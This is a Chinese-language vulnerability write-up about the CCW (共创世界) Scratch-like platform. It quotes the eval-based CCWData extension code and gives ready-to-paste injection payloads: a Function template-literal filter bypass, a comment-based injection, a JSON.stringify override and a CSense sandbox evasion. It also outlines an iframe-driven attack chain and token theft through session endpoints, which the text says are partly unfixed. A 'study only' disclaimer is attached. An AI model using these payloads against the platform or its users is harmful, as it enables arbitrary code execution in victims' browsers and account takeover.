记录共创世界的前端代码注入漏洞和盗号接口。

**仅供学习研究用途，请勿编写恶意代码，违者后果自负！**

---

## CCWData

扩展显示名称：Gandi云数据

该扩展有代码注入漏洞，且官方从未真正修复它，而是将它们标记为 `（❌过时的积木）` ，然后隐藏起来，因此仍然可以被利用，且不会触发任何警告。  

### getValueInJSON

```js
{
    key: "getValueInJSON",
    value: function getValueInJSON(args) {
        var key = scratch_vm_src_util_cast__WEBPACK_IMPORTED_MODULE_2___default().toString(args.KEY),
            json = scratch_vm_src_util_cast__WEBPACK_IMPORTED_MODULE_2___default().toString(args.JSON),
            jsonObj;
        try {
            jsonObj = JSON.parse(json)
        } catch (e) {
            return "error: ".concat(e.message)
        }
        if (/[()=]/gm.test(key))
            return "error: invalid key ".concat(key, ", cannot contain ()=");
        var key2 = "jsonObj[".concat(key, "]"),
            rtObj;
        Array.isArray(jsonObj)
            ? key = key.startsWith("[")
                ? "jsonObj".concat(key)
                : "jsonObj[".concat(key, "]")
            : /\s/gm.test(key)
                ? (
                    console.warn("[CCW Data] warning: invalid key ".concat(key, ", space and dot cannot be used together")),
                    key = 'jsonObj["'.concat(key, '"]')
                )
                : key = "jsonObj.".concat(key);
        try {
            rtObj = eval(key)
        } catch (e) {
            try {
                rtObj = eval(key2)
            } catch (e) {
                return "error: key or expression invalid"
            }
        }
        return "object" === _typeof(rtObj) ? JSON.stringify(rtObj) : rtObj
    }
}
```

乍一看好像没啥问题，好像是把 `key` 的 `()=` 这几个符号都过滤掉了，看起来好像没办法执行什么函数了……吗？  

ECMAScript 2015 新增了模板字符串功能，模板字符串可以执行函数，例如：

```js
String.raw`C:\Development\profile\aboutme.html`
```

经过我的研究，因为它输入给函数的参数0是一个数组，所以它不能直接调用 `eval` 执行字符串，  
但它可以调用 `Function` 以创建函数，然后执行函数。

```js
Function`var msg='注入代码测试';console.log(msg,arguments)``${this}${arguments}`
```

只需要将字符串里的部分字符按照以下形式替换，就能绕过正则表达式的过滤：

> `(` -> `\x28`  
> `)` -> `\x29`  
> `=` -> `\x3d`  
> ` ` -> `\x20`  

然后为了避免试图读取 `jsonObj` 的 `Function` 导致报错，需要添加 `_,` 前缀，  
于是我们就得到了：

```js
_,Function`var\x20msg\x3d'注入代码测试';console.log\x28msg,arguments\x29``${this}${arguments}`
```

将这行代码填入 `args.KEY` 里，就可以执行想要的操作了。

当然了，返回值的 `rtObj` 的类型仍受限制，您可以尝试重写 `JSON.stringify` 以返回对象。  
相关的代码请看下方的 setValueInJSON ，我这里懒得写。

### setValueInJSON

```js
{
    key: "setValueInJSON",
    value: function setValueInJSON(args) {
        var key = scratch_vm_src_util_cast__WEBPACK_IMPORTED_MODULE_2___default().toString(args.KEY),
            value = scratch_vm_src_util_cast__WEBPACK_IMPORTED_MODULE_2___default().toString(args.VALUE),
            json = scratch_vm_src_util_cast__WEBPACK_IMPORTED_MODULE_2___default().toString(args.JSON),
            jsonObj;
        try {
            jsonObj = JSON.parse(json)
        } catch (e) {
            return "error: ".concat(e.message)
        }
        if (/[()=]/gm.test(key))
            return "error: invalid key ".concat(key, ", cannot contain ()=");
        var valueObj = value;
        if (/^[\[].*?[\]]$/gm.test(value) || /^[\{].*?[\}]$/gm.test(value))
            try {
                valueObj = JSON.parse(value)
            } catch (e) {}
        "string" == typeof valueObj && /^-?\d*\.?\d*$/gm.test(valueObj) && (valueObj = Number(valueObj));
        try {
            Array.isArray(jsonObj)
                ? jsonObj[key] = valueObj
                : /[\.\[\]]/gm.test(key)
                    ? (
                        valueObj instanceof Object
                            ? (
                                valueObj = JSON.stringify(valueObj),
                                valueObj = "JSON.parse('".concat(valueObj, "')")
                            )
                            : "string" == typeof valueObj && (
                                valueObj = "'".concat(valueObj, "'")
                            ),
                        eval("jsonObj.".concat(key, " = ").concat(valueObj))
                    )
                    : jsonObj[key] = valueObj
        } catch (e) {
            return "error: key or expression invalid"
        }
        return JSON.stringify(jsonObj)
    }
}
```

它仅过滤了 `key` ，却错误地处理 `valueObj` ，导致出现了非常明显的漏洞。  

创作者能在 `args.VALUE` 里执行任意代码，只需要巧妙利用注释，让多余的代码失效，不会有烦人的过滤。

例如：

> `args.KEY` 填写为 `_;/*.`  
> `args.VALUE` 填写为 `*/ var msg='注入代码测试'; console.log(msg,arguments) //`

上述内容会被处理成这样的脚本：

```js
jsonObj._;/*. = '*/ var msg='注入代码测试'; console.log(msg,arguments) //'
```

当然了，返回的 `jsonObj` 的类型仍受限制，例如我想要发起网络请求，但返回的 `Promise` 是一个对象：

```js
jsonObj=fetch('https://community-web.ccw.site/base/dateTime',{method:'POST'}).then(r=>r.json()).then(j=>j.body)
```

针对这种情况，可以暂时重写 `JSON.stringify` 绕过限制：

```js
const{stringify}=JSON;JSON.stringify=function(a){return a===jsonObj?(JSON.stringify=stringify,a):stringify.apply(this,arguments)}
```

连在一起，填入到 `args.VALUE` 的内容是：
```js
*/jsonObj=fetch('https://community-web.ccw.site/base/dateTime',{method:'POST'}).then(r=>r.json()).then(j=>j.body);const{stringify}=JSON;JSON.stringify=function(a){return a===jsonObj?(JSON.stringify=stringify,a):stringify.apply(this,arguments)}//
```

说点题外话，众所周知，部分用户可能会安装 `CSense`，它的部分版本会使用 `secure-vm` 修复代码注入漏洞，但经过我的研究，仍然可以有办法绕过，思路如下：

```js
if (document.location) {
    // 看起来不在 secure-vm 里。
    // 这里执行你的操作。
} else {
    // 看起来在 secure-vm 里。
    // 将 CSense 添加的属性删除。
    delete this.getValueInJSON; 
    delete this.setValueInJSON;
    // 在 JSON.stringify 里抛出错误以重新执行当前积木。
    jsonObj.toJSON = _ => { throw '' };
}
```

连在一起，填入到 `args.VALUE` 的内容是：

```js
*/if(document.location){jsonObj=fetch('https://community-web.ccw.site/base/dateTime',{method:'POST'}).then(r=>r.json()).then(j=>j.body);const{stringify}=JSON;JSON.stringify=function(a){return a===jsonObj?(JSON.stringify=stringify,a):stringify.apply(this,arguments)}}else{delete this.getValueInJSON;delete this.setValueInJSON;jsonObj.toJSON=_=>{throw''}}//
```

---

## 未上架的扩展

未上架的扩展就是第三方的脚本，它并没有运行在沙盒环境里，因此漏洞是十分明显的。

关于它的加载方式，有两种情况。

### detail页面

以前会在加载作品的时候直接执行第三方的脚本，然后才在用户点击 `立即运行` 的时候询问是否运行。  
这样的漏洞是非常明显的，脚本没有经过用户同意，就已经执行。  

现在在加载扩展之前就会警告，只有用户点击 `继续运行` 才会运行扩展的脚本，降低了安全风险。  

### 其它页面

其它页面例如：
> creator  
> gandi  
> embed

这些页面在加载项目的时候会立即加载并执行扩展脚本，不会经过用户同意，因此漏洞仍然明显。

攻击者可以利用 creator 或 gandi 会立即加载作品的特性，在加载作品的时候执行第三方扩展脚本。  
用户只需要访问创作页的链接，就会将自己的账号暴露在风险之中。  

对应的，在创作者学院的文章里，可以插入 iframe ，而 iframe 能立即访问 creator 或 gandi ，形成了漏洞链，  
用户仅需点开文章，就会暴露在风险之中。  

当然了，创作页执行上述操作，并不需要使用第三方扩展，  
只需要使用 CCWData 的代码注入漏洞，配合 `当计时器 < -1` 的帽子，就可以立即执行任意代码。

---

## list_sessions接口

这个接口的漏洞十分明显，攻击者只需要知道如何借助心跳接口获取 HmacMD5 的 key ，就可以搞定 A 请求头和 B 请求头，  
然后请求这个接口，获取当前用户的 token ，从而盗号。  
配合代码注入漏洞，形成漏洞攻击链。

CSense 的作者曾多次强调 CSense 无法盗取用户的密码，却隐瞒了这一事实。  
早期 CSense 利用该漏洞，将 CSense 使用者的登录信息和 token 发送给 CSense 的作者。

该漏洞在 2026年1月16日 被修复，攻击者不能再借助该接口获取 token 。

---

## login接口

该接口会在用户登录时响应的 json 里暴露当前的 token ，但它不会被存储到本地。  

攻击者只能在用户登录的时候获取它，而且只能获取当前会话的 token 。  
但既然用户都在这时候登录了，当然可以直接获取用户输入的密码，所以该漏洞的影响有限。  
